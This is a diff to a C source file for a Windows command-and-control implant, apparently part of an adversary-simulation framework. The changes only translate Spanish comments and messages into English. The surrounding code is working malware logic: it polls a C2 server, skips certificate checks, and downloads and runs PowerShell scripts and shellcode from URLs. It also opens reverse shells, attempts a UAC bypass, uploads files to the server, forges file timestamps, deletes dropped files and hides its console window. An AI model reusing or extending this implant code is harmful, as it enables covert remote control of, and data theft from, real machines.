             if (!WinHttpReadData(hRequest, chunk, sizeof(chunk) - 1, &bytesRead)) {
-                printf("[-] Error leyendo datos\n");
+                printf("[-] Error reading data\n");
                 fflush(stdout);
                 break;
             }
@@ -4457,7 +4457,7 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
             
             char* newBuffer = realloc(response, totalSize + bytesRead + 1);
             if (!newBuffer) {
-                printf("[-] Error realocando memoria\n");
+                printf("[-] Error reallocating memory\n");
                 fflush(stdout);
                 if (response) free(response);
                 response = NULL;
@@ -4474,24 +4474,24 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
 
         if (response) {
             response[totalSize] = '\0';
-            printf("[+] Respuesta recibida (%lu bytes)\n", totalSize);
-            printf("[D] Primeros 100 bytes de respuesta: %.*s\n", 
+            printf("[+] Response received (%lu bytes)\n", totalSize);
+            printf("[D] First 100 bytes of response: %.*s\n", 
                    (int)(totalSize > 100 ? 100 : totalSize), response);
             fflush(stdout);
-            return response; // Éxito!
+            return response; // Success!
         } else {
-            printf("[-] No se pudo leer la respuesta en intento %d\n", attempt + 1);
+            printf("[-] Could not read response on attempt %d\n", attempt + 1);
             fflush(stdout);
         }
         
         if (attempt < max_retries - 1) {
-            printf("[*] Reintentando en 1 segundo...\n");
+            printf("[*] Retrying in 1 second...\n");
             fflush(stdout);
             Sleep(1000);
         }
     }
 
-    printf("[-] Todos los intentos fallaron\n");
+    printf("[-] All attempts failed\n");
     fflush(stdout);
     return NULL;
 }
@@ -4524,7 +4524,7 @@ char* exec_cmd(const char* cmd) {
 // C2 Communication & File Download
 // =================================================================================================
 
-// c2.c (reemplaza la función actual)
+// c2.c (replaces the current function)
 char* GetC2Command(const char* host, const char* path) {
     printf("[*] getc2command...\n");
     fflush(stdout);
@@ -4568,7 +4568,7 @@ char* GetC2Command(const char* host, const char* path) {
         return NULL;
     }
 
-    // Ignorar errores de certificado
+    // Ignore certificate errors
     DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                   SECURITY_FLAG_IGNORE_UNKNOWN_CA;
@@ -4684,7 +4684,7 @@ unsigned char* DownloadToBuffer(const char* url, DWORD* fileSize) {
     );
     if (!hSession) return NULL;
 
-    // ----- parsear URL -----
+    // ----- parse URL -----
     char host[256] = {0};
     char path[512] = {0};
     const char* host_start = strstr(url, "://");
@@ -4698,7 +4698,7 @@ unsigned char* DownloadToBuffer(const char* url, DWORD* fileSize) {
         strcpy(path, "/");
     }
 
-    // ----- conectar -----
+    // ----- connect -----
     HINTERNET hConnect = WinHttpConnect(hSession, UTF8ToWide(host), 443, 0);
     if (!hConnect) goto cleanup_session;
 
@@ -4720,7 +4720,7 @@ unsigned char* DownloadToBuffer(const char* url, DWORD* fileSize) {
     if (!WinHttpReceiveResponse(hRequest, NULL))
         goto cleanup_request;
 
-    // ----- leer respuesta -----
+    // ----- read response -----
     unsigned char* buffer = NULL;
     DWORD total = 0, bytesRead = 0;
     BYTE tmp[8192];
@@ -4752,7 +4752,7 @@ BOOL DownloadFromURL(const char* url, const char* filepath) {
     printf("[*] Downloading from external URL: %s -> %s\n", url, filepath);
     fflush(stdout);
 
-    // Hacer GET sin autenticación ni cifrado (es externo)
+    // Do a GET without authentication or encryption (it is external)
     char* response = retry_http_request(url, "GET", NULL, MAX_RETRIES);
     if (!response || strlen(response) == 0) {
         printf("[-] Failed to download from URL\n");
@@ -4791,7 +4791,7 @@ char* encrypt_data(const char* data) {
         return NULL;
     }
 
-    // Generar IV aleatorio
+    // Generate random IV
     HCRYPTPROV hProv;
     if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
         free(iv);
@@ -4801,15 +4801,15 @@ char* encrypt_data(const char* data) {
     CryptGenRandom(hProv, 16, iv);
     CryptReleaseContext(hProv, 0);
 
-    // Copiar IV + data
+    // Copy IV + data
     memcpy(encrypted_data, iv, 16);
     memcpy(encrypted_data + 16, data, data_len);
 
-    // Inicializar AES
+    // Initialize AES
     struct AES_ctx ctx;
     AES_init_ctx(&ctx, aes_key);
 
-    // CFB 128-bit: cifrar en bloques de 16 bytes
+    // CFB 128-bit: encrypt in 16-byte blocks
     BYTE feedback[16];
     memcpy(feedback, iv, 16);
 
@@ -4817,20 +4817,20 @@ char* encrypt_data(const char* data) {
         BYTE block[16];
         int block_size = (data_len - i < 16) ? (data_len - i) : 16;
 
-        // Cifrar el feedback para obtener keystream
+        // Encrypt the feedback to obtain the keystream
         memcpy(block, feedback, 16);
         AES_ECB_encrypt(&ctx, block);
 
-        // XOR con el plaintext
+        // XOR with the plaintext
         for (int j = 0; j < block_size; j++) {
             encrypted_data[16 + i + j] ^= block[j];
         }
 
-        // Actualizar feedback con el ciphertext (16 bytes)
+        // Update feedback with the ciphertext (16 bytes)
         memcpy(feedback, &encrypted_data[16 + i], 16);
     }
 
-    // Codificar en Base64
+    // Encode in Base64
     char* b64 = base64_encode(encrypted_data, 16 + data_len);
     free(iv);
     free(encrypted_data);
@@ -4848,10 +4848,10 @@ BOOL isValidUUID(const char* uuid) {
         }
     }
     
-    // Verificar versión (debe ser 4)
+    // Check version (must be 4)
     if (uuid[14] != '4') return FALSE;
     
-    // Verificar variant (debe ser 8, 9, A o B)
+    // Check variant (must be 8, 9, A or B)
     char variant = uuid[19];
     if (variant != '8' && variant != '9' && 
         variant != 'A' && variant != 'a' && 
@@ -4864,7 +4864,7 @@ BOOL isValidUUID(const char* uuid) {
 
 void deleteFilesDelay(void* arg) {
     char** files = (char**)arg;
-    Sleep(65000); // Esperar 65 segundos (mismo timeout que Go)
+    Sleep(65000); // Wait 65 seconds (same timeout as Go)
     if (files[0]) {
         DeleteFileA(files[0]);
         free(files[0]);
@@ -4889,14 +4889,14 @@ void handleAtomic(char* command) {
     printf("[*] Handling atomic test: %s\n", command);
     fflush(stdout);
 
-    // Verificar modo sigiloso
+    // Check stealth mode
     if (stealthModeEnabled) {
         printf("[DEBUG] Stealth mode active. Skipping atomic test.\n");
         fflush(stdout);
         return;
     }
 
-    // Extraer idAtomic
+    // Extract idAtomic
     const char* idAtomic = command + strlen("adversary:");
     if (!idAtomic || strlen(idAtomic) != 36) {
         printf("[-] Invalid id_atomic: %s\n", idAtomic ? idAtomic : "(null)");
@@ -4904,7 +4904,7 @@ void handleAtomic(char* command) {
         return;
     }
 
-    // Validar UUID (formato básico)
+    // Validate UUID (basic format)
     if (!isValidUUID(idAtomic)) {
         printf("[-] Invalid UUID format: %s\n", idAtomic);
         fflush(stdout);
@@ -4916,11 +4916,11 @@ void handleAtomic(char* command) {
     char cleanScriptName[64];
     char cleanScriptPath[MAX_PATH];
 
-    // Construir nombres
+    // Build names
     snprintf(scriptName, sizeof(scriptName), "atomic_test_%s.ps1", idAtomic);
     snprintf(cleanScriptName, sizeof(cleanScriptName), "atomic_clean_test_%s.ps1", idAtomic);
 
-    // Obtener directorio actual
+    // Get current directory
     if (!GetCurrentDirectoryA(MAX_PATH, scriptPath)) {
         printf("[-] Failed to get current directory\n");
         return;
@@ -4931,7 +4931,7 @@ void handleAtomic(char* command) {
     }
     strcat(scriptPath, scriptName);
 
-    // Limpiar script va a /temp
+    // Cleanup script goes to /temp
     GetTempPathA(MAX_PATH, cleanScriptPath);
     len = strlen(cleanScriptPath);
     if (len > 0 && cleanScriptPath[len - 1] != '\\' && cleanScriptPath[len - 1] != '/') {
@@ -4939,7 +4939,7 @@ void handleAtomic(char* command) {
     }
     strcat(cleanScriptPath, cleanScriptName);
 
-    // === 1. Descargar y ejecutar test script ===
+    // === 1. Download and run test script ===
     char downloadUrl[512];
     snprintf(downloadUrl, sizeof(downloadUrl), "%s%s/download/%s", C2_URL, MALEABLE, scriptName);
 
@@ -4952,24 +4952,24 @@ void handleAtomic(char* command) {
         return;
     }
 
-    // Ofuscar timestamps
+    // Obfuscate timestamps
     obfuscateFileTimestamp(scriptPath);
 
-    // Ejecutar: powershell -Command .\atomic_test_*.ps1
+    // Run: powershell -Command .\atomic_test_*.ps1
     char cmd[MAX_PATH];
     snprintf(cmd, sizeof(cmd), "powershell -Command .\\%s", scriptName);
 
     printf("[*] Executing test script: %s\n", cmd);
     fflush(stdout);
 
-    // Ejecutar en hilo separado
+    // Run in a separate thread
     uintptr_t thread = _beginthread(executeCommand, 0, _strdup(cmd));
     if (thread == -1L) {
         printf("[-] Failed to start test script thread\n");
         fflush(stdout);
     }
 
-    // === 2. Descargar y ejecutar cleanup script (opcional) ===
+    // === 2. Download and run cleanup script (optional) ===
     snprintf(downloadUrl, sizeof(downloadUrl), "%s%s/download/%s", C2_URL, MALEABLE, cleanScriptName);
 
     printf("[*] Attempting to download cleanup script: %s\n", downloadUrl);
@@ -4994,7 +4994,7 @@ void handleAtomic(char* command) {
         fflush(stdout);
     }
 
-    // === 3. Programar eliminación de archivos ===
+    // === 3. Schedule file deletion ===
     char* filesToDelete[2] = { _strdup(scriptPath), _strdup(cleanScriptPath) };
     if (filesToDelete[0] && filesToDelete[1]) {
         _beginthread((void(*)(void*))deleteFilesDelay, 0, filesToDelete);
@@ -5007,7 +5007,7 @@ void handleAtomic(char* command) {
     fflush(stdout);
 }
 
-// === handleDownload: descarga del C2 al beacon ===
+// === handleDownload: downloads from C2 to beacon ===
 BOOL handleDownload(const char* command) {
     const char* filename = command + 9;  // "download:"
     if (!filename || !strlen(filename)) return FALSE;
@@ -5030,7 +5030,7 @@ BOOL handleDownload(const char* command) {
 
 void SerializeBeaconString(char* buffer, int* offset, const char* str) {
     int len = strlen(str);
-    // Beacon serializa strings como: [DWORD len][bytes sin null]
+    // Beacon serializes strings as: [DWORD len][bytes without null]
     memcpy(buffer + *offset, &len, sizeof(int));
     *offset += sizeof(int);
     memcpy(buffer + *offset, str, len);
@@ -5046,17 +5046,17 @@ void BeaconDataSerializeString(char* buffer, int* offset, const char* str) {
 }
 
 void go(unsigned char * bof_data, int bof_size, char * args, int args_len) {
-    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Descargado: %d bytes", bof_size);
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Downloaded: %d bytes", bof_size);
 
     if (!args || args_len <= 0) {
         args = "";
         args_len = 0;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Ejecutando con argumento: '%.*s' (len=%d)", 
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Running with argument: '%.*s' (len=%d)", 
                 args_len, args, args_len);
     
-    // Ya NO necesitamos alineación manual aquí - RunCOFF se encarga
+    // We no longer need manual alignment here - RunCOFF handles it
     int result = RunCOFF("go", bof_data, bof_size, (unsigned char*)args, args_len);
     
     BeaconPrintf(CALLBACK_OUTPUT, "[BOF] RunCOFF result = %d", result);
@@ -5128,12 +5128,12 @@ int hooked()
     FreeLibrary(libraryBase);
     return 0;
 }
-// Función principal de manejo de comandos
+// Main command handling function
 void handleAdversary(char* command) {
     printf("[*] Handling adversary command: %s\n", command);
     fflush(stdout);
 
-    // --- Variables iniciales ---
+    // --- Initial variables ---
     char output[8192] = {0};
     char error[1024] = {0};
     char id_atomic[37] = {0};
@@ -5171,7 +5171,7 @@ void handleAdversary(char* command) {
     printf("[+] Command to execute: %s\n", command);
     fflush(stdout);
 
-    // --- Comandos de control ---
+    // --- Control commands ---
     if (strncmp(command, "adversary:", 10) == 0) {
         handleAtomic(command);
         goto send_response;
@@ -5251,7 +5251,7 @@ void handleAdversary(char* command) {
         goto send_response;
     }
 
-    // --- Comandos de ejecución remota ---
+    // --- Remote execution commands ---
     if (strncmp(command, "shell:", 6) == 0) {
         char* cmd = command + 6;
         char* result = exec_cmd(cmd);
@@ -5277,7 +5277,7 @@ void handleAdversary(char* command) {
             free(url);
         } else {
             printf("[+] executeLoader: Thread created, handle %p\n", hThread);
-            CloseHandle(hThread);  // 🔥 Desacopla
+            CloseHandle(hThread);  // Detaches
         }
         snprintf(output, sizeof(output), "Shellcode loading: %s", command + 10);
         goto send_response;
@@ -5295,7 +5295,7 @@ void handleAdversary(char* command) {
             goto send_response;
         }
 
-        // === Usa la URL correcta ===
+        // === Use the correct URL ===
         char uploadUrl[512];
         snprintf(uploadUrl, sizeof(uploadUrl), "%s%s/upload", C2_URL, MALEABLE);
 
@@ -5347,7 +5347,7 @@ void handleAdversary(char* command) {
             args->host[31] = '\0';
             args->port = atoi(port_str);
 
-            // Lanza hilo desacoplado
+            // Launch detached thread
             uintptr_t tid = _beginthread(ReverseShell, 0, args);
             if (tid == -1L) {
                 free(args);
@@ -5374,7 +5374,7 @@ void handleAdversary(char* command) {
         goto send_response;
     }
 
-    // --- Persistencia y obfuscación ---
+    // --- Persistence and obfuscation ---
     if (strncmp(command, "uac_bypass:", 11) == 0) {
         const char* payload = command + 11;
         if (executeUACBypass(payload)) {
@@ -5402,7 +5402,7 @@ void handleAdversary(char* command) {
         goto send_response;
     }
 
-    // --- Red y proxy ---
+    // --- Network and proxy ---
     if (strncmp(command, "proxy:", 6) == 0) {
         char* arg = command + 6;
         char* listenAddr = strtok(arg, ":");
@@ -5429,15 +5429,15 @@ void handleAdversary(char* command) {
         goto send_response;
     }
 
-    // --- Escaneo ---
+    // --- Scanning ---
     if (strncmp(command, "portscan:", 9) == 0) {
         char* target = command + 9;
         if (strlen(target) == 0) {
-            // Usa rhost por defecto si no especifica
+            // Use default rhost if not specified
             target = lazyconf.rhost;
         }
 
-        // Usás los puertos de lazyconf
+        // Uses the lazyconf ports
         PortScannerArgs* args = malloc(sizeof(PortScannerArgs));
         strcpy(args->targetIP, target);
         memcpy(args->ports, lazyconf.ports, lazyconf.num_ports * sizeof(int));
@@ -5481,7 +5481,7 @@ void handleAdversary(char* command) {
         goto send_response;
     }
 
-    // --- Simulación y utilidades ---
+    // --- Simulation and utilities ---
     if (strncmp(command, "simulate:", 9) == 0) {
         _beginthread(simulateLegitimateTraffic, 0, NULL);
         snprintf(output, sizeof(output), "Simulated legitimate traffic started");
@@ -5502,7 +5502,7 @@ void handleAdversary(char* command) {
     if (strncmp(command, "load_module:", 12) == 0) {
         char* url = command + 12;
         LoadModuleFromURL(url);
-        snprintf(output, sizeof(output), "Módulo cargado: %s", url);
+        snprintf(output, sizeof(output), "Module loaded: %s", url);
         goto send_response;
     }
 
@@ -5529,7 +5529,7 @@ void handleAdversary(char* command) {
         goto send_response;
     }
 
-    // --- Comando por defecto: ejecutar en shell ---
+    // --- Default command: run in shell ---
     printf("[*] Executing system command: %s\n", command);
     fflush(stdout);
     
@@ -5545,7 +5545,7 @@ void handleAdversary(char* command) {
                 memcpy(output + output_len, line, line_len);
                 output_len += line_len;
             } else {
-                // Copiar lo que quepa
+                // Copy whatever fits
                 memcpy(output + output_len, line, available);
                 output_len += available;
                 break;
@@ -5584,7 +5584,7 @@ send_response:
     cJSON_AddStringToObject(json_obj, "result_pwd", result_pwd ? result_pwd : "");
 
 
-    printf("[DEBUG] Variables antes del JSON:\n");
+    printf("[DEBUG] Variables before JSON:\n");
     printf("[DEBUG] id_atomic: '%s'\n", id_atomic ? id_atomic : "NULL");
     printf("[DEBUG] output: '%s'\n", output ? output : "NULL");
     printf("[DEBUG] error: '%s'\n", error ? error : "NULL");
@@ -5638,7 +5638,7 @@ int main() {
     xor_string((char*)OBF_USER_AGENT, sizeof(OBF_USER_AGENT)-1, XOR_KEY);
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     hex_to_bytes(aes_key_hex, aes_key, 32);
-    // Cargar configuración
+    // Load configuration
     if (!load_lazyconf()) {
         printf("[-] Using fallback config (failed to reach C2 at %ls:%d)\n", LC2_HOST, C2_PORT);
         fflush(stdout);
@@ -5648,21 +5648,21 @@ int main() {
         strncpy(lazyconf.debug_implant, "False", sizeof(lazyconf.debug_implant) - 1);
         lazyconf.debug_implant[sizeof(lazyconf.debug_implant) - 1] = '\0';
 
-        // Si no hay puertos definidos, usar puertos por defecto
+        // If no ports are defined, use default ports
         if (lazyconf.num_ports == 0) {
             int default_ports[] = {22, 80, 443, 445, 3389};
             lazyconf.num_ports = 5;
             memcpy(lazyconf.ports, default_ports, sizeof(default_ports));
         }
 
-        // Si no hay rhost definido, usar LC2_HOST como fallback (pero es wchar_t, hay que convertir)
+        // If no rhost is defined, fall back to LC2_HOST (but it is wchar_t, must be converted)
         if (strlen(lazyconf.rhost) == 0) {
             wcstombs(lazyconf.rhost, LC2_HOST, sizeof(lazyconf.rhost) - 1);
             lazyconf.rhost[sizeof(lazyconf.rhost) - 1] = '\0';
         }
     }
 
-    // Inicializar contexto AES
+    // Initialize AES context
     PacketEncryptionContext* encryptionCtx = init_aes_context(
         "36870130f03bf0bba5c8ed1d3e27117891ab415c5ea6cdbcb8731ef8fc218124"
     );
@@ -5672,7 +5672,7 @@ int main() {
     }
     printf("\n");
     fflush(stdout);
-    // Inicializar ruta actual
+    // Initialize current path
     char pwd[MAX_PATH];
     if (GetCurrentDirectoryA(MAX_PATH, pwd)) {
         result_pwd = _strdup(pwd);
@@ -5680,7 +5680,7 @@ int main() {
         result_pwd = _strdup("unknown");
     }
 
-    // Bucle principal
+    // Main loop
     while (1) {
         char* command = GetC2Command(C2_HOST, C2_PATH);
         if (command && strlen(command) > 0) {
